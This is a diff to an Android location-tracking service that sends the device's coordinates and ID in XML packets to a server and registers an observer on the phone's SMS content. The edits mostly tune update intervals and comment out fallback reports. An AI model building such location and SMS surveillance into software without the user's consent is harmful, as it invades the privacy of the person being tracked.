@@ -24,13 +24,11 @@ import android.os.Handler;
 import android.os.IBinder;
 import android.preference.PreferenceManager;
 import android.util.Log;
-import android.widget.Toast;
 
 import com.inet.android.bs.FileLog;
 import com.inet.android.bs.MainActivity;
 import com.inet.android.bs.Request;
 import com.inet.android.bs.WorkTimeDefiner;
-import com.inet.android.sms.SMSBroadcastReceiver;
 import com.inet.android.sms.SmsSentObserver;
 
 public class GPSTracker extends Service implements LocationListener {
@@ -59,18 +57,18 @@ public class GPSTracker extends Service implements LocationListener {
 	String provider;
 	StringBuilder sendStrings;
 	// The minimum distance to change Updates in meters
-	private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 1; // 100
+	private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 10; // 100
 																	// meters
 
 	// The minimum time between updates in milliseconds
 	private static long MIN_TIME_BW_UPDATES = 1000 * 30 * 1; // 30 minute
-	private static long MIN_TIME_BW_UPDATES1 = 1000 * 60 * 60 * 24; // 24 часа
+	private static long MIN_TIME_BW_UPDATES1 = 1000 * 60 * 60 * 64; // 24 часа
 	// Declaring a Location Manager
 	protected LocationManager locationManager;
 
 	private int timeUp = 0;
 	private SmsSentObserver smsSentObserver = null;
-	
+
 	@Override
 	public void onCreate() {
 		Log.d(TAG, ">>>onCreate() GPS");
@@ -143,7 +141,7 @@ public class GPSTracker extends Service implements LocationListener {
 			if (!isGPSEnabled && !isNetworkEnabled) {
 				// no network provider is enabled
 				Log.d(TAG, "!isGPS&&isNetwork");
-				sendNoLoc();
+				// sendNoLoc();
 			} else {
 				this.canGetLocation = true;
 				getLast();
@@ -151,18 +149,15 @@ public class GPSTracker extends Service implements LocationListener {
 				if (isOnline() == true) {
 					Log.d("Network", "isOnline");
 					if (isNetworkEnabled == true) {
-						locationManager.requestLocationUpdates(
-								LocationManager.NETWORK_PROVIDER, MIN_TIME_BW_UPDATES,
-								MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
-						Log.d("Network", "Network");
+						netLoc();
 					}
 				}
 			}
-			if (Double.toString(latitude).equals("0.0")
-					&& Double.toString(longitude).equals("0.0")) {
-				Log.d(TAG, "equaels = 0.0");
-				sendNoLoc();
-			} else
+//			if (Double.toString(latitude).equals("0.0")
+//					&& Double.toString(longitude).equals("0.0")) {
+//				Log.d(TAG, "equaels = 0.0");
+////				sendNoLoc();
+//			} else
 				Log.d(TAG, "equaels good");
 			sendLoc();
 
@@ -224,13 +219,13 @@ public class GPSTracker extends Service implements LocationListener {
 					Log.d(TAG, "else " + Long.toString(bestTime) + " "
 							+ bestResult);
 				}
-				if (bestResult != null) {
-					locMetod = location.getProvider();
-					latitude = location.getLatitude();
-					longitude = location.getLongitude();
-					Log.d(TAG, "locationNet != null " + locMetod);
-
-				}
+				// if (bestResult != null) {
+				// locMetod = location.getProvider();
+				// latitude = location.getLatitude();
+				// longitude = location.getLongitude();
+				// Log.d(TAG, "locationNet != null " + locMetod);
+				//
+				// }
 
 			}
 
@@ -250,23 +245,20 @@ public class GPSTracker extends Service implements LocationListener {
 	public void netLoc() {
 		// locMetod = "network";
 		locationManager.requestLocationUpdates(
-				LocationManager.NETWORK_PROVIDER, 0, 0, this);
+				LocationManager.NETWORK_PROVIDER, 1000 * 60 * 2,
+				MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
 		Log.d("Network netLoc", "Network");
 		if (locationManager != null) {
-
 			location = locationManager
 					.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
 			Log.d(TAG, "locationMannet != null ");
 
 			if (location != null) {
-				if (Double.toString(latitude).equals("0.0")
-						&& Double.toString(longitude).equals("0.0")) {
 
-				} else {
-					latitude = location.getLatitude();
-					longitude = location.getLongitude();
-					Log.d(TAG, "locationNet != null ");
-				}
+				latitude = location.getLatitude();
+				longitude = location.getLongitude();
+				Log.d(TAG, "locationNet != null ");
+
 			}
 		}
 	}
@@ -275,16 +267,15 @@ public class GPSTracker extends Service implements LocationListener {
 		if (Double.toString(latitude).equals("0.0")
 				&& Double.toString(longitude).equals("0.0")) {
 			Log.d(TAG, "equaels = 0.0");
-			sendNoLoc();
+			// sendNoLoc();
 		} else {
 
 			sp = PreferenceManager.getDefaultSharedPreferences(this);
 			String sendStr = "<packet><id>" + sp.getString("ID", "ID")
 					+ "</id><time>" + logTime()
 					+ "</time><type>5</type><cdata1>" + sendStrings
-					+ "Last Update network: " + getLatitude() + " "
-					+ getLongitude() + "</cdata1><ttl>" + locMetod
-					+ "</ttl></packet>";
+					+ "Last Update network: " + latitude + " " + longitude
+					+ "</cdata1><ttl>" + locMetod + "</ttl></packet>";
 
 			req = new Request(context);
 			req.sendRequest(sendStr);
@@ -364,7 +355,7 @@ public class GPSTracker extends Service implements LocationListener {
 			locMetod = "network";
 			latitude = location.getLatitude();
 			longitude = location.getLongitude();
-			locationManager.removeUpdates(this);
+
 		}
 	}
 
@@ -400,11 +391,12 @@ public class GPSTracker extends Service implements LocationListener {
 	public IBinder onBind(Intent arg0) {
 		return null;
 	}
+
 	public void contentObserved() {
 		if (smsSentObserver == null) {
 			smsSentObserver = new SmsSentObserver(new Handler(), context);
 			context.getContentResolver().registerContentObserver(
 					Uri.parse("content://sms"), true, smsSentObserver);
-			}
+		}
 	}
 }
